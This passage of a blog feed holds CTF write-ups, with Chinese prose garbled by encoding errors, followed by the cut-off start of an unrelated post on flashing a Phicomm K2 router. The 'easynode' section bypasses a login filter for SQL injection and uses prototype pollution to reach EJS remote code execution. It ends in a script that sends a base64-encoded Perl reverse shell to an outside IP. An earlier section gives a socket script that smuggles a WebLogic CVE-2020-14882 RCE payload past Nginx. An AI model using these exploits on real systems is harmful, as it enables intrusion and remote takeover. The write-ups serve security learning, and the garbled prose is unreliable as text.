class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">error_page</span> <span class="number">404</span> <span class="number">404</span>.php;</span><br><span class="line">        <span class="attribute">root</span> /usr/local/nginx/html;</span><br><span class="line">        <span class="attribute">index</span> index.htm index.html index.php;</span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">           <span class="attribute">root</span>           /usr/local/nginx/html;</span><br><span class="line">           <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">           <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">           <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">           <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">resolver</span> <span class="number">127.0.0.11</span> valid=<span class="number">0s</span> ipv6=<span class="literal">off</span>;</span><br><span class="line"><span class="attribute">resolver_timeout</span> <span class="number">10s</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># weblogic</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line"><span class="attribute">server_name</span>  weblogic;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">proxy_set_header</span> Host $host;</span><br><span class="line"><span class="attribute">set</span> $backend weblogic;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://$backend:7001;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç¡®å®åœ¨å†…ç½‘æœ‰ host ä¸º weblogic çš„æœåŠ¡ï¼Œä½†æ˜¯æ²¡æœ‰æä¾›å¯ SSRF çš„ä½ç½®ã€‚å¯ä»¥å‘ç°æœåŠ¡ç«¯ä½¿ç”¨çš„ Nginx ç‰ˆæœ¬ä¸º 1.17.6ï¼Œè€Œ Ngnix &lt; 1.17.7 å­˜åœ¨è¯·æ±‚èµ°ç§çš„æ¼æ´ï¼Œå› æ­¤è¿›è¡Œå°è¯•ã€‚</p><h4 id="è¯·æ±‚èµ°ç§"><a href="#è¯·æ±‚èµ°ç§" class="headerlink" title="è¯·æ±‚èµ°ç§"></a>è¯·æ±‚èµ°ç§</h4><p>ä½¿ç”¨å¦‚ä¸‹è½½è·èµ°ç§åˆ° WebLogic Console çš„ç™»å½•é¡µé¢ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/undefined</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28946</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">GET /console/login/LoginForm.jsp HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>weblogic</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨å“åº”ä¸­å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebLogic Server Version: 12.2.1.4.0</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç‰ˆæœ¬æ­£å¥½åœ¨ <code>CVE-2020-14882</code> çš„èŒƒå›´å†…ï¼Œé™¤æ­¤ä¹‹å¤–å°è¯•ç”¨ <code>CVE-2021-2109</code> å»æ”»å‡»ä½†æ²¡æœ‰æˆåŠŸï¼Œæ­¥éª¤åœåœ¨äº† redirectingã€‚å†™å‡ºå¦‚ä¸‹è„šæœ¬æ¥è¿›è¡Œæ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sSocket.connect((<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26319</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n&#x27;&#x27;&#x27;</span></span><br><span class="line">sSocket.send(payload)</span><br><span class="line">sSocket.settimeout(<span class="number">2</span>)</span><br><span class="line">response = sSocket.recv(<span class="number">2147483647</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(response) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.decode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sSocket.recv(<span class="number">2147483647</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">sSocket.close()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬åå¯åœ¨å“åº”ä¸­æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ff176972-bf1c-49ff-b7b5-36ef338179a2&#125;</span><br></pre></td></tr></table></figure><h3 id="easynode"><a href="#easynode" class="headerlink" title="easynode"></a>easynode</h3><p>å°†é™„ä»¶æºç è§£å‹ï¼Œåœ¨ app.js ä¸­å¯ä»¥å‘ç°å¦‚ä¸‹è¿‡æ»¤é€»è¾‘ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> safeQuery =  <span class="keyword">async</span> (username,password)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> waf = <span class="function">(<span class="params">str</span>)=&gt;</span>&#123;</span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> safeStr = <span class="function">(<span class="params">str</span>)=&gt;</span>&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (waf(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            str =  str.slice(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + str.slice(i + <span class="number">1</span>, str.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    username = safeStr(username);</span><br><span class="line">    password = safeStr(password);</span><br><span class="line">    <span class="keyword">let</span> sql = format(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.substr(<span class="number">0</span>,<span class="number">20</span>),password.substr(<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">    result = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(<span class="keyword">await</span> select(sql)));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>waf</code> æ–¹æ³•é‡Œå¯¹å‡ ä¸ªå­—ç¬¦è¿›è¡Œäº†æšä¸¾æ¯”å¯¹ï¼Œç„¶å <code>safeStr</code> å°†è¢«è¿‡æ»¤çš„å­—ç¬¦ä¸¤ç«¯è¿æ¥èµ·æ¥ã€‚æ­¤æ—¶ï¼Œå¦‚æœ <code>str</code> æ˜¯æ•°ç»„ï¼Œä¸”æœ‰ä¸€ä¸ªå…ƒç´ ä¸º <code>*</code>ï¼Œå°±èƒ½å°†æ•°ç»„è¿æ¥æˆå­—ç¬¦ä¸²ã€‚å› æ­¤ <code>waf</code> æ–¹æ³•çš„æšä¸¾è¿‡æ»¤å¯ä»¥ç”¨è¶³å¤Ÿé•¿çš„æ•°ç»„æ¥ç»•è¿‡ï¼Œç»è¿‡æµ‹è¯•å¯ä»¥å‘ç° <code>safeQuery([&quot;admin&#39;#&quot;,1,2,1,2,&quot;^&quot;],&quot;123&quot;)</code> å³å¯è¾¾æˆç›®çš„ã€‚å°†å…¶è½¬æ¢ä¸ºè¯·æ±‚å‚æ•°å³å¯å¾—åˆ° admin çš„ tokenã€‚</p><p>åœ¨æºç ä¸­å¯å‘ç°ä¸€ä¸ª test.jsï¼Œå…¶ä¸­æµ‹è¯•äº†ä¸€ä¸ª ejs çš„æ¨¡æ¿æ³¨å…¥ RCEï¼Œåœ¨ <code>/admin</code> è·¯ç”±ä¸‹å¯æ‰¾åˆ°å¯¹ board çš„å–ç”¨å’Œæ¸²æŸ“ã€‚è€Œ board æ˜¯åœ¨ <code>/adminDIV</code> è·¯ç”±ä¸‹è¢«å­˜å…¥çš„ã€‚</p><blockquote><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">    <span class="keyword">var</span> addDIV =<span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;(data[key])&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">    <span class="comment">// __proto__:&#123;</span></span><br><span class="line">    <span class="comment">//     outputFunctionName: &#123;</span></span><br><span class="line">    <span class="comment">//         data[key]: evilCode</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    extend(&#123;&#125;,<span class="built_in">JSON</span>.parse(addDIV));</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.renderFile(__dirname + <span class="string">&quot;/public/admin.ejs&quot;</span>,&#123;addDIV,username&#125;)</span><br><span class="line">&#125;</span><br><span class="line">sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥å‘ç°ï¼Œå‡å¦‚ username æ˜¯ <code>__proto__</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶å¯¼å…¥çš„å±æ€§å³å¯æˆåŠŸæ±¡æŸ“åˆ° <code>__proto__.outputFunctionName</code>ï¼Œä»è€Œè§¦å‘æ¨¡æ¿æ³¨å…¥çš„ RCEã€‚å› æ­¤é¦–å…ˆè¦ä½¿ç”¨ <code>/addAdmin</code> æ·»åŠ ä¸€ä¸ªç”¨æˆ·åä¸º <code>__proto__</code> çš„ç”¨æˆ·ï¼Œç„¶åç™»å½•è¿™ä¸ªç”¨æˆ·ã€‚å†ä½¿ç”¨ <code>/adminDIV</code> è·¯ç”±æ›´æ”¹æ•°æ®åº“ä¸­çš„ boardï¼Œæ­¤æ—¶åªéœ€è¦ä¼ å…¥å‚æ•°åä¸º data çš„ä¸€ä¸²æ¶æ„è½½è·å³å¯ï¼Œæ„é€ å‡ºå¦‚ä¸‹è„šæœ¬è¿›è¡Œæ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Client()</span><br><span class="line">URL = <span class="string">&quot;http://29cc0540-0d12-42f1-92c0-7f4e9694f50e.node4.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/login&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;username[0]&quot;</span>: <span class="string">&quot;admin&#x27;#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[1]&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[2]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[3]&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[4]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username[5]&quot;</span>: <span class="string">&quot;^&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;lemonPass&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">token = json.loads(response.content.decode())[<span class="string">&quot;token&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] queried cookie token <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;token&quot;</span>, token)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Cookie set <span class="subst">&#123;session.cookies&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/addAdmin&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;__proto__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;lemonPass&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] AddAdmin response is \&quot;<span class="subst">&#123;response.content.decode()&#125;</span>\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/login&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;__proto__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;lemonPass&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">token = json.loads(response.content.decode())[<span class="string">&quot;token&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] queried __proto__ cookie token <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">session.cookies.delete(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;token&quot;</span>, token)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Cookie set <span class="subst">&#123;session.cookies&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/adminDIV&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#x27;&#x27;&#123;&quot;outputFunctionName&quot;:&quot;x;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iOC4xMzYuOC4yMTAiOyRwPTMyNTU7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jw==|base64 -d|bash&#x27;);x&quot;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Inject evil code response is \&quot;<span class="subst">&#123;response.content.decode()&#125;</span>\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = session.get(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/admin&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Triggered reverse shell&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626849290142742/61f01db3abd17f7cbf3d4c5d6d89a6498ad5a182.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;864760b9-8f84-4389-b904-38a1975af1f2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ CH341A ç¼–ç¨‹å™¨æ•‘ç –æ–è®¯ K2</title>
      <link href="/zh-CN/posts/fbc679d5.html"/>
      <url>/zh-CN/posts/fbc679d5.html</url>
      
        <content type="html"><![CDATA[<h2 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h2><p>å¶ç„¶çš„æœºä¼šæ‹¿åˆ°äº†ä¸¤å°æ–è®¯ K2ï¼Œæœ¬æ¥è®¡åˆ’ç€æŠŠåŸæœ¬çš„ Pandvan åˆ·æˆ OpenWRTï¼Œå¥ˆä½• K2 çš„ 64M å†…å­˜å¤§æ¦‚æ˜¯é¡¶ä¸ä½ <a href="https://github.com/garypang13">@Garypang</a>  å¤§ä½¬ç¼–è¯‘å¥½çš„å›ºä»¶ï¼Œåˆä¸æƒ³è‡ªå·±ç¼–è¯‘æŠ˜è…¾ï¼Œç´¢æ€§å°±æ›´æ–°ä¸€æ³¢åŸæœ¬çš„å›ºä»¶ã€‚å¤‡ä»½ EEPROMã€æ›´æ–°è·¯ç”±å™¨å›ºä»¶å’Œ breed çš„è¿‡ç¨‹ååˆ†é¡ºåˆ©ï¼Œç„¶é‡å¯ä¹‹åè·¯ç”±å™¨å°±ç›´æ¥å˜æˆäº†äº¤æ¢æœºã€‚éšçº¦æ„Ÿè§‰åˆ°æ˜¯ breed æ²¡äº†ï¼Œé‡å¯äº†å‡ æ¬¡åç«é€Ÿä¸‹å•äº†ç¼–ç¨‹å™¨å‡†å¤‡ç¡¬åˆ· EEPROM äº†ã€‚</p><p><escape><span id="more"></span></escape></p><h2 id="åŠ¨æ‰‹"><a href="#åŠ¨æ‰‹" class="headerlink" title="åŠ¨æ‰‹"></a>åŠ¨æ‰‹</h2><p>åˆ·æœºäº”åˆ†é’Ÿï¼Œæ‹†æœºä¸¤å°æ—¶ï¼Œæ’¬æ£’ä¸€å®šè¦å‡†å¤‡å¥½ï¼Œä¸€å­—èºä¸åˆ€ä¹Ÿå¯ä»¥ã€‚æ³¨æ„æ‹†æœºçš„æ—¶å€™å°†è·¯ç”±å™¨æ–­ç”µã€‚CH341A ç¼–ç¨‹å™¨å’Œ SOP8 çš„å¤¹å­ï¼Œå¦‚æœæ²¡æœ‰å¤¹å­çš„è¯å°±å¾—æŠŠèŠ¯ç‰‡ç„Šä¸‹æ¥å†™å…¥å†ç„Šå›å»ã€‚å¸ä¸‹è·¯ç”±å™¨èƒŒé¢è´´çº¸ä¸‹çš„ä¸¤ä¸ªèºä¸ï¼Œä½¿ç”¨æ’¬æ£’å¯¹ä»˜å¡æ‰£ï¼Œå¯ä»¥å°†è·¯ç”±å™¨æ‹†å¼€ã€‚</p><p>å°†çº¿çš„ä¸€æ®µæ’åˆ°æ¿å­ä¸Šï¼Œæ³¨æ„æ¿å­ä¸Šçš„æ•°å­—ï¼Œå¯¹åº”çº¿çš„æ’å£ä¸Šçš„ä¸¤ä¸ªæ•°å­—çš„é¡ºåºã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536464896/3743d4ac761ba3fd5277c85fcae6b7821b0012e9.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536492167/749febe00b86ba688525073f7c25229bad0a42de.png"></p><p>å°†æ¿å­æ’åˆ°ç¼–ç¨‹å™¨çš„é åçš„ä½ç½®ä¸Šï¼ˆå¦‚æœæ’åˆ°å‰é¢çš„ä½ç½®ä¸Šä¼šç”±äºèŠ¯ç‰‡çš„å‹å·ä¸å¯¹è€Œè¯»ä¸åˆ°èŠ¯ç‰‡ï¼‰ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536598475/191bf4643c76d8f27fafe7b35df97cd1752432ee.png"></p><p>å°†ç¼–ç¨‹å™¨æ¥å…¥ç”µè„‘ï¼Œæ­¤æ—¶å°†ä¼šçœ‹åˆ°åä¸º USB UART-LPT çš„æ²¡æœ‰é©±åŠ¨çš„è®¾å¤‡ã€‚æ­¤æ—¶è¿è¡Œé©±åŠ¨å®‰è£…ç¨‹åºï¼Œé¡ºåˆ©çš„è¯å°†çœ‹åˆ°è®¾å¤‡å˜ä¸º USB-SERIAL CH341Aã€‚æ­¤æ—¶åœ¨è·¯ç”±å™¨çš„ä¸»æ¿ä¸Šæ‰¾åˆ°èŠ¯ç‰‡çš„ä½ç½®ï¼Œå°†å¤¹å­å¯¹ç€å¼•è„šå¤¹ä¸Šå»ï¼Œä¿è¯å¤¹å­ç‰¢å›ºã€‚å¦‚æœå¤¹å­çš„æ­£åæ­£ç¡®ï¼Œè·¯ç”±å™¨çš„æŒ‡ç¤ºç¯å°†äº®èµ·ä¸ºæ©˜çº¢è‰²ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626536969980/fe1d450f8f788928b01971e08602178301f97dc2.png"></p><p>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ AsProgrammer ç¨‹åºï¼Œ ç‚¹å‡»èŠ¯ç‰‡æ£€æµ‹å›¾æ ‡ï¼Œå¯ä»¥æ£€æµ‹åˆ°å®¹é‡ä¸º 8388608 çš„ W25Q64BV èŠ¯ç‰‡ã€‚å…ˆä½¿ç”¨è¯»å…¥çš„åŠŸèƒ½å°†å…¶ä¸ŠåŸæœ¬çš„å†…å®¹å¤‡ä»½ä¿å­˜åˆ°è®¡ç®—æœºä¸­ã€‚ç„¶åæ‰“å¼€ä» <a href="https://breed.hackpascal.net/">https://breed.hackpascal.net/</a> ä¸‹è½½å¥½çš„ breed å›ºä»¶ï¼Œå°†å…¶å†™å…¥èŠ¯ç‰‡ä¸­ã€‚æœ€å¥½å‹¾é€‰å†™å…¥é€‰é¡¹ä¸‹çš„æ ¡éªŒï¼Œå¦‚æœæ­¤æ—¶æ‰§è¡Œå¤±è´¥ï¼Œå¯ä»¥å°è¯•ç‚¹ä¸€æ¬¡æ“¦é™¤ï¼Œå†ç»ˆæ­¢æ“ä½œï¼Œæ­¤æ—¶å¯èƒ½å¯ä»¥æˆåŠŸå†™å…¥ã€‚å½“çœ‹åˆ°ä¸‹å›¾çš„æ—¶å€™ä¾¿æ˜¯å†™å…¥å›ºä»¶æˆåŠŸã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626537357305/a5d880d6514cb7fc005554102b08cc623dae74c4.png"></p><p>å°†å¤¹å­æ¾å¼€ï¼Œç»™è·¯ç”±å™¨æ’ä¸Šç”µæºï¼Œç»™ç”µè„‘æ’ä¸Š LAN å£çš„ç½‘çº¿ï¼Œå³å¯ç”¨ 192.168.1.1 è¿›å…¥åˆ° breed ä¸­ã€‚å°†å¤‡ä»½çš„ EEPROM æ¢å¤ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/bcd1e494-d526-4ad9-aa35-31dc34ee3fxu/1626537502775/2269e4f2af3be3051d00fc8c475895efa1627334.png"></p><p>æ¢å¤å®Œæˆåç‚¹ MAC 